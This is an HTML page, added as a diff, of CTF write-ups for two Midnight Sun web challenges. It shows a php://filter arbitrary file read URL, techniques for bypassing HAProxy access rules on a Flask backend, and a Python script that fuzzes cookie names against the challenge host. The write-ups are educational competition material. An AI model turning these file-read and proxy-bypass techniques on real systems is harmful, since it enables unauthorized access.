@@ -1,0 +1,250 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Web</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#hackingforso">hackingforso</a>
+    
+                <a class="dropdown-item" href="#shithappens">shithappens</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#hackingforso" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hackingforso</span>
+            </a>
+    
+<a href="#shithappens" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">shithappens</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="hackingforso"><a class="header-link" href="#hackingforso"></a>hackingforso</h3>
+<p>There is an arbitrary file read vulnerability:</p>
+<p><code>http://hackingforso-01.play.midnightsunctf.se/?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php</code></p>
+<p>(we can&#39;t use <code>..</code> and <code>/xxxx</code>, but we can use <code>php://filter</code>)</p>
+<p>When I read the <code>/proc/self/map</code>, I found this:</p>
+<pre class="hljs"><code><span class="hljs-number">562</span>fa83f6000-<span class="hljs-number">562</span>fa8e74000 r-xp <span class="hljs-number">00000000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">269523</span>                     /usr/local/sbin/php-fpm
+<span class="hljs-number">562</span>fa9074000-<span class="hljs-number">562</span>fa9119000 r--p <span class="hljs-number">00</span>a7e000 <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">269523</span>                     /usr/local/sbin/php-fpm
+<span class="hljs-number">562</span>fa9119000-<span class="hljs-number">562</span>fa9125000 rw-p <span class="hljs-number">00</span>b23000 <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">269523</span>                     /usr/local/sbin/php-fpm
+<span class="hljs-number">562</span>fa9125000-<span class="hljs-number">562</span>fa9134000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>
+<span class="hljs-number">562</span>faa1e0000-<span class="hljs-number">562</span>faa3ff000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [heap]
+<span class="hljs-number">562</span>faa3ff000-<span class="hljs-number">562</span>faa403000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [heap]
+<span class="hljs-number">7</span>f999efbd000-<span class="hljs-number">7</span>f999f1bd000 r-xp <span class="hljs-number">00000000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">284231</span>                     /var/www/messages/<span class="hljs-number">21</span>db4c2051b8e454d73f7b97664770ef.so
+<span class="hljs-number">7</span>f999f1bd000-<span class="hljs-number">7</span>f999f1be000 r--p <span class="hljs-number">00000000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">284231</span>                     /var/www/messages/<span class="hljs-number">21</span>db4c2051b8e454d73f7b97664770ef.so
+<span class="hljs-number">7</span>f999f1be000-<span class="hljs-number">7</span>f999f1bf000 rw-p <span class="hljs-number">00001000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">284231</span>                     /var/www/messages/<span class="hljs-number">21</span>db4c2051b8e454d73f7b97664770ef.so
+<span class="hljs-number">7</span>f999f1bf000-<span class="hljs-number">7</span>f999f3c0000 r-xp <span class="hljs-number">00000000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">279464</span>                     /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">libmcrypt</span>/<span class="hljs-title">ofb</span>.<span class="hljs-title">so</span></span>
+<span class="hljs-number">7</span>f999f3c0000-<span class="hljs-number">7</span>f999f3c1000 r--p <span class="hljs-number">00001000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">279464</span>                     /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">libmcrypt</span>/<span class="hljs-title">ofb</span>.<span class="hljs-title">so</span></span>
+<span class="hljs-number">7</span>f999f3c1000-<span class="hljs-number">7</span>f999f3c2000 rw-p <span class="hljs-number">00002000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">279464</span>                     /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">libmcrypt</span>/<span class="hljs-title">ofb</span>.<span class="hljs-title">so</span></span>
+<span class="hljs-number">7</span>f999f3c2000-<span class="hljs-number">7</span>f999f5c3000 r-xp <span class="hljs-number">00000000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">279466</span>                     /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">libmcrypt</span>/<span class="hljs-title">rc2</span>.<span class="hljs-title">so</span></span>
+<span class="hljs-number">7</span>f999f5c3000-<span class="hljs-number">7</span>f999f5c4000 r--p <span class="hljs-number">00001000</span> <span class="hljs-symbol">ca:</span><span class="hljs-number">01</span> <span class="hljs-number">279466</span>                     /usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">libmcrypt</span>/<span class="hljs-title">rc2</span>.<span class="hljs-title">so</span></span>
+...</code></pre><p>The <code>21db4c2051b8e454d73f7b97664770ef.so</code> looks like someone&#39;s malicious <code>so</code> file.</p>
+<p>So I tried to download this <code>so</code> file, and use <code>strings</code> command:</p>
+<pre class="hljs"><code>$ strings <span class="hljs-number">21</span>db4c2051b8e454d73f7b97664770ef<span class="hljs-selector-class">.so</span>
+
+...
+./flag_dispenser &gt; /var/www/messages/hurt_me_plentye124f251ac<span class="hljs-selector-class">.txt</span>
+...</code></pre><p>OK, let&#39;s try to read the <code>hurt_me_plentye124f251ac.txt</code>:</p>
+<p><code>midnight{i_h@t3_cryPt0_1n_w3b_ch4llz}</code></p>
+<p>WOW, I got the flag :)</p>
+<h3 id="shithappens"><a class="header-link" href="#shithappens"></a>Shithappens</h3>
+<p>This is a HAproxy bypass challenge. The key here is to exploit the difference between HAproxy and flask.</p>
+<pre class="hljs"><code>frontend internet_access
+  bind *:80
+  errorfile 403 /etc/haproxy/errorfiles/403custom.http
+  http-response set-header Server Server
+  http-request deny if METH_POST
+  http-request deny <span class="hljs-keyword">if</span> { path_beg /admin }
+  <span class="hljs-keyword">http</span>-request deny <span class="hljs-keyword">if</span> { cook(IMPERSONATE) -m found }
+  <span class="hljs-keyword">http</span>-request deny <span class="hljs-keyword">if</span> { hdr_len(Cookie) gt <span class="hljs-number">69</span> }
+  <span class="hljs-keyword">mode</span> <span class="hljs-keyword">http</span>
+  <span class="hljs-keyword">use_backend</span> <span class="hljs-keyword">test</span>
+
+<span class="hljs-keyword">backend</span> <span class="hljs-keyword">test</span>
+  <span class="hljs-keyword">balance</span> <span class="hljs-keyword">roundrobin</span>
+  <span class="hljs-keyword">mode</span> <span class="hljs-keyword">http</span>
+  <span class="hljs-keyword">server</span> <span class="hljs-keyword">flaskapp</span> <span class="hljs-keyword">app</span>:8282 resolvers docker_resolver resolve-prefer ipv4</code></pre><ol class="list">
+<li><code>path_beg</code>: request <code>/%2fadmin</code> or simply <code>//admin</code></li>
+<li><code>METH_POST</code>: Just use <code>HEAD</code></li>
+<li><code>hdr_len(Cookie)</code>: send multiple <code>Cookie</code> headers</li>
+<li><code>cook(IMPERSONATE)</code>: Insert invalid chracter like <code>IMPERSONATE\x0b</code>. The backend <code>flask</code> will resolve it as <code>IMPERSONATE</code>.</li>
+</ol>
+<p>Here is the fuzz script for step 4.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):
+    c = chr(i)
+    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> (string.ascii_letters + string.digits):
+        <span class="hljs-keyword">continue</span>
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((<span class="hljs-string">'shithappens-01.play.midnightsunctf.se'</span>, <span class="hljs-number">80</span>))
+    s.send((f<span class="hljs-string">'''
+GET //admin HTTP/1.1                                                                                                                     
+Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
+cooKie: ;IMPERSONATE{c}=admin
+Connection: close
+'''</span> + <span class="hljs-string">'\n'</span>).lstrip().replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>).encode())
+    print(repr(c), s.recv(<span class="hljs-number">65536</span>).decode())
+    s.close()</code></pre><p>For the the reason why flask resolves it as <code>IMPERSONATE</code>, see <a href="https://www.cnblogs.com/20175211lyz/p/12637624.html">this post</a> (in Chinese), or check the flask source code.</p>
+<p>In this challenge, there is also a debug interface <code>/debug</code> which can be useful for debugging the cookies.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
